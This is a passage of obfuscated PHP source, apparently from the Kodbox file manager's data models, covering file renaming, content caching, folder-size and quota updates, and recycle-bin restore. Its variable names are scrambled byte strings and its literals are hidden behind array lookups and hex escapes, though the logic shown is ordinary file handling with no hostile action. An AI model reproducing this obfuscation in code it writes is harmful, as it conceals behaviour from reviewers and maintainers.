($¼µİÔÜÏ[$£Ù÷ğÁğ[468]] != $£Ù÷ğÁğ[101]) { $½æÖ û[$£Ù÷ğÁğ[469]] = substr(get_path_ext($ù…Çı¸Ş), 0, 10); } Model($£Ù÷ğÁğ[616])->eventRename($ÑóÆú¹, $¼µİÔÜÏ[$£Ù÷ğÁğ[32]], $ù…Çı¸Ş); $this->sourceCacheClear($ÑóÆú¹); $this->setNamePinyin($ÑóÆú¹, $½æÖ û[$£Ù÷ğÁğ[32]], !1); $this->updateModifyTime($¼µİÔÜÏ[$£Ù÷ğÁğ[193]]); $Åì¶Ì¸î = $this->where(array($£Ù÷ğÁğ[474] => $ÑóÆú¹))->data($½æÖ û)->save(); $æ§˜±· = $£Ù÷ğÁğ[2246] . $¼µİÔÜÏ[$£Ù÷ğÁğ[193]]; if (isset(self::$cacheChildList[$æ§˜±·])) { unset(self::$cacheChildList[$æ§˜±·]); } return $Åì¶Ì¸î; } public function setNamePinyin($›¶£•ãá, $Úƒò£Ÿğ, $åºã­µê = true) { $í÷Áıà¡ =& $_SERVER[Ñ¯©ç]; $¦é”÷İÁ = Input::check($Úƒò£Ÿğ, $í÷Áıà¡[638]); $µÏşñÑ = array($í÷Áıà¡[500] => KodSort::makeStr($Úƒò£Ÿğ)); if ($¦é”÷İÁ) { $µÏşñÑ[$í÷Áıà¡[521]] = str_replace($í÷Áıà¡[53], $í÷Áıà¡[12], Pinyin::get($Úƒò£Ÿğ)); $µÏşñÑ[$í÷Áıà¡[520]] = Pinyin::get($Úƒò£Ÿğ, $í÷Áıà¡[639]); } if (!$åºã­µê && !$¦é”÷İÁ) { $µÏşñÑ[$í÷Áıà¡[521]] = null; $µÏşñÑ[$í÷Áıà¡[520]] = null; } $this->metaSet($›¶£•ãá, $µÏşñÑ); } public function getContent($Ï£ÈÛïÔ) { $Ó¬‰™Úø =& $_SERVER[Ñ¯©ç]; $¢ü›É‡Ş = $this->fileInfoGet($Ï£ÈÛïÔ); if (!$¢ü›É‡Ş) { return !1; } if ($¢ü›É‡Ş[$Ó¬‰™Úø[89]] == 0) { return $Ó¬‰™Úø[12]; } $‡‡¦±èº = $Ó¬‰™Úø[2260] . $¢ü›É‡Ş[$Ó¬‰™Úø[530]]; if ($¢ü›É‡Ş[$Ó¬‰™Úø[89]] <= 1024 * 10) { $†Ø„âœ = Cache::get($‡‡¦±èº); if (!$†Ø„âœ) { $†Ø„âœ = IO::getContent($¢ü›É‡Ş[$Ó¬‰™Úø[97]]); Cache::set($‡‡¦±èº, $†Ø„âœ); } return $†Ø„âœ; } if (!$¢ü›É‡Ş[$Ó¬‰™Úø[97]]) { return $Ó¬‰™Úø[12]; } return IO::getContent($¢ü›É‡Ş[$Ó¬‰™Úø[97]]); } public function setDesc($¾Ùò˜µ, $·»Ì‰İş) { $Éñº€ìæ =& $_SERVER[Ñ¯©ç]; Model($Éñº€ìæ[616])->eventAddDesc($¾Ùò˜µ, $·»Ì‰İş); return $this->metaSet($¾Ùò˜µ, $Éñº€ìæ[509], $·»Ì‰İş); } public function setContent($‡±ãĞ£­, $±ŸÛ¿—š = '') { $Æ‡ø×Úã =& $_SERVER[Ñ¯©ç]; $Ê¤¦½ó¤ = $this->sourceInfo($‡±ãĞ£­); $§ü¡ÂÔ = $this->fileInfoGet($‡±ãĞ£­); if (!$§ü¡ÂÔ || !$Ê¤¦½ó¤) { return !1; } $È—¿ñË = Model($Æ‡ø×Úã[527])->addFileByContent($±ŸÛ¿—š, $Ê¤¦½ó¤[$Æ‡ø×Úã[32]]); $æÛÏ¥ıí = $this->fileHistory($Ê¤¦½ó¤, $È—¿ñË[$Æ‡ø×Úã[524]], $È—¿ñË[$Æ‡ø×Úã[89]]); if (!$æÛÏ¥ıí) { return Model($Æ‡ø×Úã[527])->remove($È—¿ñË[$Æ‡ø×Úã[524]]); } $this->folderSizeReset($Ê¤¦½ó¤[$Æ‡ø×Úã[193]]); return !0; } public function fileSubstr($ùÍ†ü÷Ù, $³ŒìŸ î, $¥ÚßÓ©İ) { $ÖøşŞÎ¹ = $this->fileInfoGet($ùÍ†ü÷Ù); if (!$ÖøşŞÎ¹) { return !1; } return IO::fileSubstr($ÖøşŞÎ¹[$_SERVER[Ñ¯©ç][97]], $³ŒìŸ î, $¥ÚßÓ©İ); } public function fileInfoGet($±³å……å) { $õ£ˆŠÎˆ =& $_SERVER[Ñ¯©ç]; $ØüÕ¶±Œ = $this->sourceInfo($±³å……å); if (!$ØüÕ¶±Œ || $ØüÕ¶±Œ[$õ£ˆŠÎˆ[468]]) { return !1; } $úÁ×š¨Õ = $õ£ˆŠÎˆ[531] . $ØüÕ¶±Œ[$õ£ˆŠÎˆ[524]]; $³è„šôÜ = _get(self::$cacheFileInfo, $úÁ×š¨Õ); if ($³è„šôÜ) { return $³è„šôÜ; } $ñæ¾Æç´ = Model($õ£ˆŠÎˆ[527])->fileInfo($ØüÕ¶±Œ[$õ£ˆŠÎˆ[524]]); if ($ñæ¾Æç´) { $ñæ¾Æç´[$õ£ˆŠÎˆ[32]] = $ØüÕ¶±Œ[$õ£ˆŠÎˆ[32]]; } self::$cacheFileInfo[$úÁ×š¨Õ] = $ñæ¾Æç´; return $ñæ¾Æç´; } private function folderChildrenNumber($ÌşÑºé) { $éäü‘õÅ =& $_SERVER[Ñ¯©ç]; $ ¾Ä“¯ = $this->sourceInfo($ÌşÑºé); $õü¯Æéü = array($éäü‘õÅ[635] => array($éäü‘õÅ[595], $ ¾Ä“¯[$éäü‘õÅ[568]] . $ÌşÑºé . $éäü‘õÅ[596]), $éäü‘õÅ[632] => $ ¾Ä“¯[$éäü‘õÅ[553]], $éäü‘õÅ[487] => intval($ ¾Ä“¯[$éäü‘õÅ[488]]), $éäü‘õÅ[629] => 1); $‹¡úÔ·… = $this->where($õü¯Æéü)->count(); $¬áÔ˜¯² = $this->where($õü¯Æéü)->where(array($éäü‘õÅ[629] => 0))->count(); return array($éäü‘õÅ[93] => $¬áÔ˜¯², $éäü‘õÅ[94] => $‹¡úÔ·…); } public function pathInfo($¬®Õ†–, $×¢üÑÉ— = false) { $«³îì‹ã =& $_SERVER[Ñ¯©ç]; $×¢üÑÉ— = !1; $¬®Õ†– = intval($¬®Õ†–); $òšé«¢¤ = $«³îì‹ã[517] . intval($×¢üÑÉ—) . $«³îì‹ã[445] . $¬®Õ†–; $İ÷†İ”ä = _get(self::$cachePathInfo, $òšé«¢¤); if ($İ÷†İ”ä) { return $İ÷†İ”ä; } $‚óøî„É = $this->sourceInfo($¬®Õ†–); if (!$‚óøî„É) { return !1; } $‚óøî„É = $this->_listDataApplyItem($‚óøî„É, $×¢üÑÉ—); self::$cachePathInfo[$òšé«¢¤] = $‚óøî„É; return $‚óøî„É; } public static $cachePathInfoMore = array(); public function pathInfoMore($†‹‡Â) { $×¹‹„Ôß =& $_SERVER[Ñ¯©ç]; $½Ã²Ä­÷ = _get(self::$cachePathInfoMore, $†‹‡Â); if ($½Ã²Ä­÷) { return $½Ã²Ä­÷; } $ÈíùŠÈ = $this->pathInfo($†‹‡Â); if (!$ÈíùŠÈ) { return !1; } if ($ÈíùŠÈ[$×¹‹„Ôß[468]] == $×¹‹„Ôß[101]) { $ÈíùŠÈ[$×¹‹„Ôß[92]] = $this->folderChildrenNumber($†‹‡Â); } self::$cachePathInfoMore[$†‹‡Â] = $ÈíùŠÈ; return $ÈíùŠÈ; } public function sourceInfo($¬ï›ğ‰‚) { $ˆ±üü =& $_SERVER[Ñ¯©ç]; if (!$¬ï›ğ‰‚) { return array(); } $¬ï›ğ‰‚ = intval($¬ï›ğ‰‚); $ñåã€Ş“ = $ˆ±üü[516] . $¬ï›ğ‰‚; $•’Õ˜³ò = _get(self::$cacheSourceInfo, $ñåã€Ş“); if ($•’Õ˜³ò) { return $•’Õ˜³ò; } $Îâ½ÊÌì = $this->where(array($ˆ±üü[194] => $¬ï›ğ‰‚))->find(); self::$cacheSourceInfo[$ñåã€Ş“] = $Îâ½ÊÌì; return self::$cacheSourceInfo[$ñåã€Ş“]; } public function sourceCacheClear($‹“ñÌ‰— = false) { self::cacheClear($‹“ñÌ‰—); } public static function cacheClear($–·©˜şØ = false) { $ìó¤ö‡İ =& $_SERVER[Ñ¯©ç]; if ($–·©˜şØ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ìó¤ö‡İ[516] . $–·©˜şØ]); unset(self::$cachePathInfoMore[$–·©˜şØ]); unset(self::$cachePathInfo[$ìó¤ö‡İ[2261] . $–·©˜şØ]); unset(self::$cachePathInfo[$ìó¤ö‡İ[2262] . $–·©˜şØ]); } public function metaSet($¬èàÌ¦, $˜¼åÔ·€ = null, $ÛÛõòéò = null) { $è†¢„Î = parent::metaSet($¬èàÌ¦, $˜¼åÔ·€, $ÛÛõòéò); if ($è†¢„Î) { $this->sourceCacheClear($¬èàÌ¦); } return $è†¢„Î; } public function pathInfoByPath($¡ÚÎÎö¤, $ç°Í––) { $ŞÁô„õ÷ =& $_SERVER[Ñ¯©ç]; $×èÛŠàœ = !$ç°Í–– ? array() : explode($ŞÁô„õ÷[8], trim($ç°Í––, $ŞÁô„õ÷[8])); $“ğç¡Ú = $¡ÚÎÎö¤; foreach ($×èÛŠàœ as $§Ñ¯ŸÔ) { $áŠÔ±Î“ = array($ŞÁô„õ÷[193] => $“ğç¡Ú, $ŞÁô„õ÷[32] => $§Ñ¯ŸÔ); $»ëƒùš = $this->field($ŞÁô„õ÷[2263])->where($áŠÔ±Î“)->select(); if (!$»ëƒùš) { return !1; } $»ëƒùš = array_sort_by($»ëƒùš, $ŞÁô„õ÷[488]); $“ğç¡Ú = $»ëƒùš[0][$ŞÁô„õ÷[194]]; } $åºÌ§“ = $this->sourceInfo($“ğç¡Ú); $this->pathInfoFilter($åºÌ§“); return $åºÌ§“; } protected function updateModifyTime($ø˜Êş’) { $Ñ¶°ß¤§ =& $_SERVER[Ñ¯©ç]; $ÔÎÎì’¿ = defined($Ñ¶°ß¤§[2178]) ? USER_ID : 0; if (!$ø˜Êş’) { return; } if (!is_array($ø˜Êş’)) { $ø˜Êş’ = array($ø˜Êş’); } foreach ($ø˜Êş’ as $áÎò¼¢¹ => $ü¬ƒÌí¸) { $ø˜Êş’[$áÎò¼¢¹] = intval($ü¬ƒÌí¸); $this->sourceCacheClear($ü¬ƒÌí¸); } $ã«Ï‹Ğê = array($Ñ¶°ß¤§[194] => array($Ñ¶°ß¤§[7], $ø˜Êş’)); $Ó²§¾¢Ú = array($Ñ¶°ß¤§[634] => $ÔÎÎì’¿, $Ñ¶°ß¤§[481] => time()); $this->where($ã«Ï‹Ğê)->save($Ó²§¾¢Ú); } public function folderSizeReset($°´ÁÖ¸, $ê¯ƒÁŠÊ = false) { $¯ÆöªäÄ =& $_SERVER[Ñ¯©ç]; if ($this->statusIgnoreResetSpace) { return; } $›¨¾ÄßÏ = $this->sourceInfo($°´ÁÖ¸); $ƒí–ÕşÂ = $¯ÆöªäÄ[2264] . $°´ÁÖ¸; CacheLock::lock($ƒí–ÕşÂ, 20); if ($ê¯ƒÁŠÊ === !1) { $this->sourceCacheClear($°´ÁÖ¸); $›¨¾ÄßÏ = $this->sourceInfo($°´ÁÖ¸); $ÜáËÎ˜ = array($¯ÆöªäÄ[460] => $°´ÁÖ¸, $¯ÆöªäÄ[487] => 0); $òÒƒı‹Ê = $this->where($ÜáËÎ˜)->sum($¯ÆöªäÄ[89]); $ê¯ƒÁŠÊ = intval($òÒƒı‹Ê) - intval($›¨¾ÄßÏ[$¯ÆöªäÄ[89]]); } if ($ê¯ƒÁŠÊ == 0) { return CacheLock::unlock($ƒí–ÕşÂ); } $„ëğøª— = $this->parentLevelArray($›¨¾ÄßÏ[$¯ÆöªäÄ[568]]); if (!$„ëğøª—) { $„ëğøª— = array(); } $„ëğøª—[] = $›¨¾ÄßÏ[$¯ÆöªäÄ[194]]; $ÜáËÎ˜ = array($¯ÆöªäÄ[194] => array($¯ÆöªäÄ[475], $„ëğøª—)); if ($ê¯ƒÁŠÊ < 0) { $ÜáËÎ˜[$¯ÆöªäÄ[89]] = array($¯ÆöªäÄ[1068], abs($ê¯ƒÁŠÊ)); } $this->where($ÜáËÎ˜)->setAdd($¯ÆöªäÄ[89], $ê¯ƒÁŠÊ); CacheLock::unlock($ƒí–ÕşÂ); $ æ¹Ú˜¶ = $¯ÆöªäÄ[2265] . $›¨¾ÄßÏ[$¯ÆöªäÄ[191]] . $¯ÆöªäÄ[4] . $›¨¾ÄßÏ[$¯ÆöªäÄ[553]]; $ø§àÛ¥Ÿ = array($›¨¾ÄßÏ[$¯ÆöªäÄ[191]], $›¨¾ÄßÏ[$¯ÆöªäÄ[553]]); TaskRun::timeLimitCall($ æ¹Ú˜¶, $¯ÆöªäÄ[2266], $ø§àÛ¥Ÿ, 1.5); } public function folderSizeResetChildren($Ş´¹·×€) { $üæÖ´µ =& $_SERVER[Ñ¯©ç]; $this->sourceCacheClear($Ş´¹·×€); $¦ãôÅôğ = $this->sourceInfo($Ş´¹·×€); $²©Æó¿û = array($üæÖ´µ[629] => 1, $üæÖ´µ[632] => $¦ãôÅôğ[$üæÖ´µ[553]], $üæÖ´µ[635] => array($üæÖ´µ[595], $¦ãôÅôğ[$üæÖ´µ[568]] . $Ş´¹·×€ . $üæÖ´µ[596])); $ÇÎŞë¥ = $üæÖ´µ[2267]; $Ø¬ƒ×È• = $this->field($ÇÎŞë¥)->where($²©Æó¿û)->select(); $²©Æó¿û[$üæÖ´µ[468]] = 0; $Û‡Ú÷™ = $this->field($ÇÎŞë¥)->where($²©Æó¿û)->select(); if (!$Û‡Ú÷™) { return; } $Ø¬ƒ×È•[] = $¦ãôÅôğ; $Ø¬ƒ×È• = array_to_keyvalue($Ø¬ƒ×È•, $üæÖ´µ[194]); foreach ($Ø¬ƒ×È• as $×§Ääê¾ => $¿ë¯ÌÛæ) { $Ø¬ƒ×È•[$×§Ääê¾][$üæÖ´µ[2268]] = $Ø¬ƒ×È•[$×§Ääê¾][$üæÖ´µ[89]]; $Ø¬ƒ×È•[$×§Ääê¾][$üæÖ´µ[89]] = 0; } foreach ($Û‡Ú÷™ as $¿ë¯ÌÛæ) { $øşæøª¿ = $¿ë¯ÌÛæ[$üæÖ´µ[193]] . $üæÖ´µ[12]; if (!isset($Ø¬ƒ×È•[$øşæøª¿])) { continue; } if ($¿ë¯ÌÛæ[$üæÖ´µ[488]] == $Ø¬ƒ×È•[$øşæøª¿][$üæÖ´µ[488]]) { $Ø¬ƒ×È•[$øşæøª¿][$üæÖ´µ[89]] += $¿ë¯ÌÛæ[$üæÖ´µ[89]]; } } foreach ($Ø¬ƒ×È• as $¿ë¯ÌÛæ) { $ú÷ïñƒ = $this->parentLevelArray($¿ë¯ÌÛæ[$üæÖ´µ[568]]); foreach ($ú÷ïñƒ as $øşæøª¿) { $øşæøª¿ = $øşæøª¿ . $üæÖ´µ[12]; if (!isset($Ø¬ƒ×È•[$øşæøª¿])) { continue; } if ($¿ë¯ÌÛæ[$üæÖ´µ[488]] == $Ø¬ƒ×È•[$øşæøª¿][$üæÖ´µ[488]]) { $Ø¬ƒ×È•[$øşæøª¿][$üæÖ´µ[89]] += $¿ë¯ÌÛæ[$üæÖ´µ[89]]; } } } $³°İôÁŒ = array(); foreach ($Ø¬ƒ×È• as $¿ë¯ÌÛæ) { if ($¿ë¯ÌÛæ[$üæÖ´µ[89]] == $¿ë¯ÌÛæ[$üæÖ´µ[2268]]) { continue; } $³°İôÁŒ[] = array($üæÖ´µ[194], $¿ë¯ÌÛæ[$üæÖ´µ[194]], $üæÖ´µ[89], $¿ë¯ÌÛæ[$üæÖ´µ[89]]); } $this->saveAll($³°İôÁŒ); } public function userSpaceReset($Å‘è’ã = false) { $¹é‚÷Å™ =& $_SERVER[Ñ¯©ç]; $®¦¢µùí = $this->where(array($¹é‚÷Å™[191] => self::TYPE_USER, $¹é‚÷Å™[553] => $Å‘è’ã, $¹é‚÷Å™[468] => 0))->sum($¹é‚÷Å™[89]); $®¦¢µùí = !$®¦¢µùí || $®¦¢µùí <= 0 ? 0 : $®¦¢µùí; Model($¹é‚÷Å™[561])->userEdit($Å‘è’ã, array($¹é‚÷Å™[1944] => $®¦¢µùí)); } public function targetSpaceUpdate($¾¥Š¦‚â, $éõ–˜ÒÃ) { $³¤ùÑÆ¿ =& $_SERVER[Ñ¯©ç]; if (!$éõ–˜ÒÃ) { return; } if (!in_array($¾¥Š¦‚â, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $€‹™€æ¯ = $this->targetSpaceSize($¾¥Š¦‚â, $éõ–˜ÒÃ); if ($¾¥Š¦‚â == self::TYPE_USER) { Model($³¤ùÑÆ¿[561])->userEdit($éõ–˜ÒÃ, array($³¤ùÑÆ¿[1944] => $€‹™€æ¯)); } else { if ($¾¥Š¦‚â == self::TYPE_GROUP) { Model($³¤ùÑÆ¿[569])->groupEdit($éõ–˜ÒÃ, array($³¤ùÑÆ¿[1944] => $€‹™€æ¯)); } } } public function targetSpaceSize($³–³¦ç‰, $õı¸ ©) { $…Ùï£ =& $_SERVER[Ñ¯©ç]; $€¾ü„Íµ = 0; $©†‡„¯’ = $this->targetSourceRoot($³–³¦ç‰, $õı¸ ©, !0); foreach ($©†‡„¯’ as $­ˆÄââ) { if (!$­ˆÄââ) { continue; } $€¾ü„Íµ += floatval($­ˆÄââ[$…Ùï£[89]]); $µ†ØÀØ° = array($…Ùï£[635] => array($…Ùï£[595], $…Ùï£[578] . $­ˆÄââ[$…Ùï£[194]] . $…Ùï£[596])); $í†ûúÇ„ = Model($…Ùï£[486])->field($…Ùï£[474])->where($µ†ØÀØ°)->select(); $í†ûúÇ„ = array_to_keyvalue($í†ûúÇ„, $…Ùï£[12], $…Ùï£[194]); $í†ûúÇ„ = array_unique(array_filter($í†ûúÇ„)); if ($í†ûúÇ„) { $µ†ØÀØ° = array($…Ùï£[474] => array($…Ùï£[475], $í†ûúÇ„)); $€¾ü„Íµ += floatval($this->where($µ†ØÀØ°)->sum($…Ùï£[89])); } } $€¾ü„Íµ = !$€¾ü„Íµ || $€¾ü„Íµ <= 0 ? 0 : $€¾ü„Íµ; return $€¾ü„Íµ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($È¢åƒ¶) { return $this->fileTypeProfile($È¢åƒ¶, SourceModel::TYPE_USER); } public function groupFileTypeProfile($èòéè˜¦) { return $this->fileTypeProfile($èòéè˜¦, SourceModel::TYPE_GROUP); } private function fileTypeProfile($º³¡ª——, $Ãì›ä½) { $°¢Õ‘÷˜ =& $_SERVER[Ñ¯©ç]; $”½ú‰Á = $°¢Õ‘÷˜[2269] . $º³¡ª—— . $°¢Õ‘÷˜[11] . $Ãì›ä½; $Õ¡÷šÜß = Cache::get($”½ú‰Á); if ($Õ¡÷šÜß) { return $Õ¡÷šÜß; } $œ´­éğ¹ = array($°¢Õ‘÷˜[629] => 0); if ($º³¡ª—— != !1) { $œ´­éğ¹[$°¢Õ‘÷˜[553]] = $º³¡ª——; $œ´­éğ¹[$°¢Õ‘÷˜[191]] = $Ãì›ä½; } $ƒ³”˜£ò = array(); $ƒ³”˜£ò[$°¢Õ‘÷˜[2270]] = array($°¢Õ‘÷˜[2271] => LNG($°¢Õ‘÷˜[2270]), $°¢Õ‘÷˜[2272] => $this->where($œ´­éğ¹)->count(), $°¢Õ‘÷˜[600] => $this->where($œ´­éğ¹)->sum($°¢Õ‘÷˜[89])); $¿×é„ã€ = KodIO::fileTypeList(); foreach ($¿×é„ã€ as $ã§íüÈ› => $ß½¼çæÆ) { $œ´­éğ¹[$°¢Õ‘÷˜[469]] = $this->fileTypeWhere($ã§íüÈ›); $ƒ³”˜£ò[$ã§íüÈ›] = array($°¢Õ‘÷˜[2271] => $ß½¼çæÆ[$°¢Õ‘÷˜[32]], $°¢Õ‘÷˜[2272] => $this->where($œ´­éğ¹)->count(), $°¢Õ‘÷˜[600] => $this->where($œ´­éğ¹)->sum($°¢Õ‘÷˜[89])); } Cache::set($”½ú‰Á, $ƒ³”˜£ò, 1200); return $ƒ³”˜£ò; } public function fileNameExist($¡Ù­öä¯, $õıÎÙ½•) { $ÉÓÁÛ³á =& $_SERVER[Ñ¯©ç]; $ˆÇˆ¨ˆâ = $this->field($ÉÓÁÛ³á[2273])->where(array($ÉÓÁÛ³á[193] => $¡Ù­öä¯, $ÉÓÁÛ³á[32] => $õıÎÙ½•, $ÉÓÁÛ³á[488] => 0))->find(); return is_array($ˆÇˆ¨ˆâ) ? $ˆÇˆ¨ˆâ[$ÉÓÁÛ³á[194]] : !1; } public function childList($€Çå—÷Ñ) { $Î Îıí¦ =& $_SERVER[Ñ¯©ç]; $ÄÔÇ­ÏÇ = $Î Îıí¦[2246] . $€Çå—÷Ñ; if (isset(self::$cacheChildList[$ÄÔÇ­ÏÇ])) { return self::$cacheChildList[$ÄÔÇ­ÏÇ]; } $ø×°¬® = array($Î Îıí¦[193] => intval($€Çå—÷Ñ), $Î Îıí¦[488] => 0); $éòÊ›§Ï = $this->where($ø×°¬®)->select(); $éòÊ›§Ï = $éòÊ›§Ï ? $éòÊ›§Ï : array(); self::$cacheChildList[$ÄÔÇ­ÏÇ] = $éòÊ›§Ï; foreach ($éòÊ›§Ï as $ïşŠ•ß) { $ÄÔÇ­ÏÇ = $Î Îıí¦[516] . $ïşŠ•ß[$Î Îıí¦[194]]; self::$cacheSourceInfo[$ÄÔÇ­ÏÇ] = $ïşŠ•ß; } return $éòÊ›§Ï; } public function fileNameAuto($ô·ûë¤Ÿ, $†×õÇ¨Õ, $úÔçğË = REPEAT_RENAME, $ıøÓÙª = false) { $Ï•–³Ãí =& $_SERVER[Ñ¯©ç]; $™‚ˆƒİœ = get_path_ext($†×õÇ¨Õ); $áÛËÎÓ = $™‚ˆƒİœ ? get_path_ext_name($†×õÇ¨Õ) . $Ï•–³Ãí[2274] . $™‚ˆƒİœ : $†×õÇ¨Õ . $Ï•–³Ãí[443]; $ïÇıÌ­¹ = array($Ï•–³Ãí[193] => $ô·ûë¤Ÿ, $Ï•–³Ãí[488] => 0, $Ï•–³Ãí[32] => array($Ï•–³Ãí[442], $áÛËÎÓ)); $¢•îıÊ = $this->field($Ï•–³Ãí[32])->where($ïÇıÌ­¹)->select(); $äç›²»› = array_to_keyvalue($¢•îıÊ, $Ï•–³Ãí[12], $Ï•–³Ãí[32]); return $this->fileNameAutoGet($äç›²»›, $†×õÇ¨Õ, $úÔçğË, $ıøÓÙª); } public function fileNameAutoGet($ªöóÍàÊ, $…®®–é¸, $ÌêÔÌáé, $¡á‚¼õ„) { $Éıöî·š =& $_SERVER[Ñ¯©ç]; if ($ÌêÔÌáé == REPEAT_REPLACE || !$ªöóÍàÊ || !in_array_not_case($…®®–é¸, $ªöóÍàÊ) || $¡á‚¼õ„ && $ÌêÔÌáé != REPEAT_RENAME_FOLDER) { return $…®®–é¸; } if ($ÌêÔÌáé == REPEAT_SKIP) { return !1; } $â³ôˆ©Ğ = $Éıöî·š[10] . get_path_ext($…®®–é¸); $â³ôˆ©Ğ = $â³ôˆ©Ğ == $Éıöî·š[10] || $¡á‚¼õ„ ? $Éıöî·š[12] : $â³ôˆ©Ğ; for ($êöŸæ°‚ = 1; $êöŸæ°‚ <= count($ªöóÍàÊ) + 1; $êöŸæ°‚++) { $•†ğ•Æü = substr($…®®–é¸, 0, strlen($…®®–é¸) - strlen($â³ôˆ©Ğ)); $ºˆ˜Ãı€ = $•†ğ•Æü . "\50{$êöŸæ°‚}\x29{$â³ôˆ©Ğ}"; if (!in_array_not_case($ºˆ˜Ãı€, $ªöóÍàÊ)) { return $ºˆ˜Ãı€; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\x63\145\137\162\145\x63\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\124\x69\x6d\x65", "\164\151\x6d\x65", "\151\156\163\145\x72\164", "\x66\165\156\x63\164\x69\x6f\156")); public function listData($¤„£ñò = false) { $µ¡êÉ´€ =& $_SERVER[Ñ¯©ç]; $¤„£ñò = $¤„£ñò ? $¤„£ñò : USER_ID; $ÊŸùš˜” = $this->where(array($µ¡êÉ´€[1748] => $¤„£ñò))->select(); return array_to_keyvalue($ÊŸùš˜”, $µ¡êÉ´€[12], $µ¡êÉ´€[194]); } public function moveToRecycle($¨ñªÁ†€) { $¸¡Ş¥¯Ø =& $_SERVER[Ñ¯©ç]; $³£ó’Ê = Model($¸¡Ş¥¯Ø[1391]); $Ú ´°ê³ = $³£ó’Ê->sourceInfo($¨ñªÁ†€); if (!$Ú ´°ê³ || $Ú ´°ê³[$¸¡Ş¥¯Ø[488]] == $¸¡Ş¥¯Ø[101]) { return; } $¬„çø = array($¸¡Ş¥¯Ø[474] => $¨ñªÁ†€, $¸¡Ş¥¯Ø[1748] => USER_ID, $¸¡Ş¥¯Ø[631] => $Ú ´°ê³[$¸¡Ş¥¯Ø[191]], $¸¡Ş¥¯Ø[632] => $Ú ´°ê³[$¸¡Ş¥¯Ø[553]], $¸¡Ş¥¯Ø[635] => $Ú ´°ê³[$¸¡Ş¥¯Ø[568]]); $this->add($¬„çø); $this->recycleMove($¨ñªÁ†€, 1); if ($Ú ´°ê³[$¸¡Ş¥¯Ø[468]] == $¸¡Ş¥¯Ø[101]) { $˜Öœ“¯ä = array($¸¡Ş¥¯Ø[635] => array($¸¡Ş¥¯Ø[595], $Ú ´°ê³[$¸¡Ş¥¯Ø[568]] . $¨ñªÁ†€ . $¸¡Ş¥¯Ø[596])); $³£ó’Ê->where($˜Öœ“¯ä)->setField($¸¡Ş¥¯Ø[488], 1); } } public function clear() { $this->remove(!1); } public function remove($¸æáè“™ = false, $Ï•ıÇ“ = false) { $£€Ï†… =& $_SERVER[Ñ¯©ç]; $Ï•ıÇ“ = $Ï•ıÇ“ ? $Ï•ıÇ“ : USER_ID; $©ôÔÃÕ‘ = Model($£€Ï†…[1391]); $ùÖ‡™› = $this->listData($Ï•ıÇ“); $¸æáè“™ = $¸æáè“™ === !1 ? !1 : $¸æáè“™; $§Ê£´‡ã = array(); foreach ($ùÖ‡™› as $º‰§’Ùİ) { if ($¸æáè“™ != !1 && !in_array($º‰§’Ùİ, $¸æáè“™)) { continue; } $Öİ™–Õ‘ = $©ôÔÃÕ‘->sourceInfo($º‰§’Ùİ); $©ôÔÃÕ‘->remove($º‰§’Ùİ, !1); $é¦ü×Òå = $Öİ™–Õ‘[$£€Ï†…[191]] . $£€Ï†…[11] . $Öİ™–Õ‘[$£€Ï†…[553]]; $§Ê£´‡ã[$é¦ü×Òå] = array($£€Ï†…[631] => $Öİ™–Õ‘[$£€Ï†…[191]], $£€Ï†…[553] => $Öİ™–Õ‘[$£€Ï†…[553]]); $this->where(array($£€Ï†…[194] => $º‰§’Ùİ))->delete(); } foreach ($§Ê£´‡ã as $ÕĞí“ ) { $©ôÔÃÕ‘->targetSpaceUpdate($ÕĞí“ [$£€Ï†…[191]], $ÕĞí“ [$£€Ï†…[553]]); } } public function restore($¯Ä¿–´· = false) { $ı›ÉÁİ¼ = $this->listData(); $this->_restoreSource($ı›ÉÁİ¼, $¯Ä¿–´·); } public function removeUserAll($š‡ÉèÚˆ) { $this->remove(!1, $š‡ÉèÚˆ); } public function restoreItem($»ÅüÕéŒ) { $this->_restoreSource(array($»ÅüÕéŒ), array($»ÅüÕéŒ)); } private function _restoreSource($¬Éã¦¾œ, $øÙİĞªî) { $÷­åõ§² =& $_SERVER[Ñ¯©ç]; $í¯¬Äşö = Model($÷­åõ§²[1391]); $øÙİĞªî = $øÙİĞªî == !1 ? !1 : $øÙİĞªî; if (!$¬Éã¦¾œ) { return !0; } $š¼à’‹¿ = array(); foreach ($¬Éã¦¾œ as $™øºÛ“Š) { if ($øÙİĞªî != !1 && !in_array($™øºÛ“Š, $øÙİĞªî)) { continue; } $î²Ë‚Ÿ = $í¯¬Äşö->sourceInfo($™øºÛ“Š); $¼¥–ÃÖ = $í¯¬Äşö->sourceInfo($î²Ë‚Ÿ[$÷­åõ§²[193]]); if ($¼¥–ÃÖ[$÷­åõ§²[488]] == $÷­åõ§²[101]) { continue; } $í¯¬Äşö->lockMoveStart($™øºÛ“Š); $this->recycleMove($™øºÛ“Š, 0); if ($î²Ë‚Ÿ[$÷­åõ§²[468]] == $÷­åõ§²[101]) { $üºÇ¨¯Î = array($÷­åõ§²[635] => array($÷­åõ§²[595], $î²Ë‚Ÿ[$÷­åõ§²[568]] . $™øºÛ“Š . $÷­åõ§²[596])); $í¯¬Äşö->where($üºÇ¨¯Î)->setField($÷­åõ§²[488], 0); $this->restoreFolderChildren($™øºÛ“Š, $¬Éã¦¾œ); } $this->where(array($÷­åõ§²[194] => $™øºÛ“Š))->delete(); $í¯¬Äşö->folderSizeReset($î²Ë‚Ÿ[$÷­åõ§²[193]]); $š¼à’‹¿[] = $î²Ë‚Ÿ[$÷­åõ§²[193]]; if ($î²Ë‚Ÿ[$÷­åõ§²[468]] == $÷­åõ§²[101]) { $š¼à’‹¿[] = $™øºÛ“Š; } $í¯¬Äşö->lockMoveEnd($™øºÛ“Š); } $í¯¬Äşö->updateModifyTime($š¼à’‹¿); } private function restoreFolderChildren($†ëëÍ²¨, $æ‘Ô‘œı) { $®˜¯í™Ú =& $_SERVER[Ñ¯©ç]; $¸’¹Àè™ = Model($®˜¯í™Ú[1391]); $€÷ªÉè = array($®˜¯í™Ú[194] => array($®˜¯í™Ú[7], array())); foreach ($æ‘Ô‘œı as $Ü¦Ã¶ï) { 